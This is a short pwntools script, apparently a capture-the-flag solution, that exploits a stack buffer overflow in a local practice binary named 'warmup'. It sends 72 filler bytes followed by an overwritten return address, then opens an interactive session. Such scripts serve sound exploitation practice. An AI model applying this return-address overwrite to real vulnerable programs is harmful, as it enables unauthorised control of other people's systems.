#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/warmup", checksec=False)
p = process()

input()
payload = b'A'*72 + p64(0x40060d+4)
p.sendlineafter(b">", payload)

p.interactive()
